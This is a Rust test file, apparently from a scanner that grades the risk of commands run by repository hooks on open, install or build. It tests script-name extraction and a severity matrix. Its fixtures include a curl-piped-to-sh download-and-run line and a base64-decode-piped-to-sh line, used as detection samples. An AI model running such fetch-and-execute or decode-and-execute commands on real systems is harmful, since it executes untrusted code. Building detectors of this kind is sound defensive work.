    fn files_run_names_the_script_after_an_interpreter() {
        let f = files_run;
        assert_eq!(f("node install.js"), ["install.js"]);
        assert_eq!(f("node ./install.js --flag"), ["install.js"]);
        assert_eq!(f("bash ./scripts/setup.sh arg"), ["scripts/setup.sh"]);
        assert_eq!(f("python3 -u tools/run.py"), ["tools/run.py"]);
        assert_eq!(f("python3.12 tools/run.py"), ["tools/run.py"]);
        assert_eq!(f("NODE_ENV=prod node \"my script.js\""), ["my script.js"]);
        assert_eq!(f("sudo bash x.sh"), ["x.sh"]);
        assert_eq!(f("deno run main.ts"), ["main.ts"]);
        assert_eq!(f("node ../tools/a.js"), ["../tools/a.js"]);
        assert_eq!(f("node /opt/a.js"), ["/opt/a.js"]);
        assert_eq!(f("node a.js > out.txt"), ["a.js"]);
        assert_eq!(
            f("powershell -ExecutionPolicy Bypass -File .\\setup.ps1"),
            ["setup.ps1"]
        );
        assert_eq!(f("pwsh -NoProfile setup.ps1"), ["setup.ps1"]);
        assert_eq!(f("cmd /c node a.js"), ["a.js"]);
        assert_eq!(f("node -r ./hook.js app.js"), ["hook.js", "app.js"]);
        assert_eq!(f("node --require=./hook.js app.js"), ["hook.js", "app.js"]);
    }

    #[test]
    fn files_run_names_a_leading_script() {
        let f = files_run;
        assert_eq!(f("./setup.sh"), ["setup.sh"]);
        assert_eq!(f("./bin/setup --fast"), ["bin/setup"]);
        assert_eq!(f("setup.sh"), ["setup.sh"]);
        assert_eq!(f("scripts/post.sh --x"), ["scripts/post.sh"]);
        assert_eq!(f("../x/run.sh"), ["../x/run.sh"]);
        assert_eq!(f("FOO=1 ./setup.sh"), ["setup.sh"]);
    }

    #[test]
    fn files_run_follows_every_segment_once() {
        assert_eq!(
            files_run("node a.js && python b.py; sh c.sh | tee out || node a.js"),
            ["a.js", "b.py", "c.sh"]
        );
    }

    #[test]
    fn files_run_is_empty_for_inline_code_and_other_programs() {
        for c in [
            "python3 -c \"print(1)\"",
            "node -e \"console.log(1)\"",
            "node -p 1",
            "bash -c \"./x.sh\"",
            "bash -ec 'make'",
            "python -m http.server",
            "perl -e 'print 1'",
            "powershell -Command Get-Date",
            "npm run build",
            "cat file.txt",
            "make",
            "echo ./x.sh",
            "node",
            "",
        ] {
            assert!(files_run(c).is_empty(), "{c:?} -> {:?}", files_run(c));
        }
    }

    #[test]
    fn files_run_keeps_flags_that_are_not_inline_code() {
        assert_eq!(files_run("bash -e setup.sh"), ["setup.sh"]);
        assert_eq!(files_run("bash -x setup.sh"), ["setup.sh"]);
        assert_eq!(files_run("node --max-old-space-size=4096 a.js"), ["a.js"]);
    }

    #[test]
    fn npm_run_target_names_the_script() {
        let t = npm_run_target;
        assert_eq!(t("npm run build"), Some("build".to_string()));
        assert_eq!(t("npm run-script build"), Some("build".to_string()));
        assert_eq!(
            t("npm run watch:client -- --flag"),
            Some("watch:client".to_string())
        );
        assert_eq!(t("yarn build"), Some("build".to_string()));
        assert_eq!(t("yarn run build"), Some("build".to_string()));
        assert_eq!(t("pnpm build"), Some("build".to_string()));
        assert_eq!(t("pnpm run build"), Some("build".to_string()));
        assert_eq!(t("bun run build"), Some("build".to_string()));
        assert_eq!(t("npm run --silent build"), Some("build".to_string()));
        assert_eq!(t("npm run -w pkg build"), Some("build".to_string()));
        assert_eq!(t("npm run \"build\""), Some("build".to_string()));
        assert_eq!(t("cd app && npm run build"), Some("build".to_string()));
        assert_eq!(t("CI=1 npm run build"), Some("build".to_string()));
    }

    #[test]
    fn npm_run_target_is_none_for_everything_else() {
        for c in [
            "npm install",
            "npm run",
            "npm ci",
            "yarn",
            "yarn install",
            "yarn add left-pad",
            "yarn dlx create-foo",
            "pnpm install",
            "pnpm i",
            "pnpm dlx x",
            "pnpm exec x",
            "bun x",
            "bun install",
            "bun build.js",
            "node build.js",
            "echo npm run build",
            "",
        ] {
            assert_eq!(npm_run_target(c), None, "{c:?}");
        }
    }

    const TRIGGERS: [Trigger; 4] = [
        Trigger::Open,
        Trigger::Install,
        Trigger::Build,
        Trigger::OptIn,
    ];

    #[test]
    fn matrix_matches_the_table() {
        use Severity::{Critical as C, High as H, Info as I, Low as L, Medium as M};
        // Rows: Open, Install, Build, OptIn. Columns: Allowlisted, Plain, Runner, Network,
        // DecodeExec, FetchExec, RunsData.
        // A build step that downloads and runs is HIGH, not CRITICAL: ordinary Makefiles install
        // tools that way. A build step that decodes and runs, or runs data, stays CRITICAL.
        let table: [[Severity; 7]; 4] = [
            [I, M, M, H, C, C, C],
            [I, M, M, H, C, C, C],
            [I, I, L, M, C, H, C],
            [I, I, L, L, H, H, H],
        ];
        let shapes = [
            Shape::Allowlisted,
            Shape::Plain,
            Shape::Runner,
            Shape::Network,
            Shape::DecodeExec,
            Shape::FetchExec,
            Shape::RunsData,
        ];
        for (t, row) in TRIGGERS.iter().zip(table) {
            for (s, want) in shapes.iter().zip(row) {
                assert_eq!(severity(*t, *s, None), want, "{t:?} x {s:?}");
            }
        }
    }

    #[test]
    fn a_relative_path_named_like_an_interpreter_is_a_file_of_the_repo() {
        // The word is a file of the repo, and when its name is an interpreter's, the file it is
        // given runs as well.
        for (cmd, want) in [
            ("./tools/sh -c echo", vec!["tools/sh"]),
            ("tools/bash run.sh", vec!["tools/bash", "run.sh"]),
            ("../bin/node app.js", vec!["../bin/node", "app.js"]),
            (".\\tools\\python3 x.py", vec!["tools/python3", "x.py"]),
            ("sudo ./bin/sh -c id", vec!["bin/sh"]),
            (
                "./bin/node -r ./pre.js app.js",
                vec!["bin/node", "pre.js", "app.js"],
            ),
            ("./tools/lint --fix", vec!["tools/lint"]),
        ] {
            let got: Vec<String> = files_run(cmd)
                .into_iter()
                .map(|f| f.replace('\\', "/"))
                .collect();
            assert_eq!(got, want, "{cmd}");
        }
        // An interpreter on the machine still runs the file after it.
        assert_eq!(files_run("/bin/sh run.sh"), ["run.sh"]);
        assert_eq!(files_run("sh run.sh"), ["run.sh"]);
        assert!(files_run("/usr/bin/node -e 1").is_empty());
        assert!(files_run("$HOME/bin/sh -c id").is_empty());
        assert!(files_run("~/bin/sh -c id").is_empty());
    }

    #[test]
    fn a_script_run_from_the_project_folder_variable_is_a_file_whatever_its_name() {
        for (cmd, want) in [
            ("$CLAUDE_PROJECT_DIR/hooks/check", vec!["hooks/check"]),
            (
                "\"$CLAUDE_PROJECT_DIR\"/hooks/check.rb --x",
                vec!["hooks/check.rb"],
            ),
            ("${CLAUDE_PROJECT_DIR}/run", vec!["run"]),
            ("%CLAUDE_PROJECT_DIR%\\tools\\go", vec!["tools\\go"]),
            ("${workspaceFolder}/bin/lint", vec!["bin/lint"]),
            ("${workspaceRoot}/bin/lint", vec!["bin/lint"]),
            ("sudo $CLAUDE_PROJECT_DIR/bin/x", vec!["bin/x"]),
            // An interpreter-named file under the variable runs, and so does what it is given.
            (
                "$CLAUDE_PROJECT_DIR/bin/node app.js",
                vec!["bin/node", "app.js"],
            ),
        ] {
            assert_eq!(files_run(cmd), want, "{cmd}");
        }
        // The variable is not a prefix of some longer name, and a bare variable is no file.
        assert!(files_run("$CLAUDE_PROJECT_DIRX/bin/x").is_empty());
        assert!(files_run("$CLAUDE_PROJECT_DIR").is_empty());
        assert!(files_run("$CLAUDE_PROJECT_DIR/").is_empty());
        // Arguments of an interpreter keep their form for the caller to resolve.
        assert_eq!(
            files_run("node $CLAUDE_PROJECT_DIR/x.js"),
            ["$CLAUDE_PROJECT_DIR/x.js"]
        );
    }

    #[test]
    fn a_build_step_that_downloads_and_runs_is_high_and_one_that_decodes_is_critical() {
        let golangci = "curl -sSfL https://example.invalid/install.sh | sh -s -- -b /usr/local/bin";
        assert_eq!(classify(golangci), Shape::FetchExec);
        assert_eq!(
            severity(Trigger::Build, classify(golangci), None),
            Severity::High
        );
        let decode = "echo aGk= | base64 -d | sh";
        assert_eq!(classify(decode), Shape::DecodeExec);
        assert_eq!(
            severity(Trigger::Build, classify(decode), None),
            Severity::Critical
        );
        // On open or install, and when the build step reaches a HIGH file, nothing changes.
        for t in [Trigger::Open, Trigger::Install] {
            assert_eq!(severity(t, Shape::FetchExec, None), Severity::Critical);
        }
        assert_eq!(
            severity(Trigger::Build, Shape::FetchExec, Some(Severity::High)),
            Severity::Critical
        );
    }

    #[test]
    fn reaching_a_high_file_raises_to_critical_or_high() {
        let shapes = [
            Shape::Allowlisted,
            Shape::Plain,
            Shape::Runner,
            Shape::Network,
            Shape::RunsData,
        ];
        for s in shapes {
            for r in [Severity::High, Severity::Critical] {
                for t in [Trigger::Open, Trigger::Install, Trigger::Build] {
                    assert_eq!(
                        severity(t, s, Some(r)),
                        Severity::Critical,
                        "{t:?} {s:?} {r:?}"
                    );
                }
                assert_eq!(
                    severity(Trigger::OptIn, Shape::Plain, Some(r)),
                    Severity::High
                );
            }
        }
        // OptIn never goes above what its own shape gives when that is already HIGH.
        assert_eq!(
            severity(Trigger::OptIn, Shape::FetchExec, Some(Severity::Critical)),
            Severity::High
        );
    }

    #[test]
    fn reaching_a_lower_file_changes_nothing() {
        for t in TRIGGERS {
            for s in [
                Shape::Plain,
                Shape::Runner,
                Shape::Network,
                Shape::FetchExec,
            ] {
                for r in [
                    None,
                    Some(Severity::Info),
                    Some(Severity::Low),
                    Some(Severity::Medium),
                ] {
                    assert_eq!(severity(t, s, r), severity(t, s, None), "{t:?} {s:?} {r:?}");
                }
            }
        }
    }
}
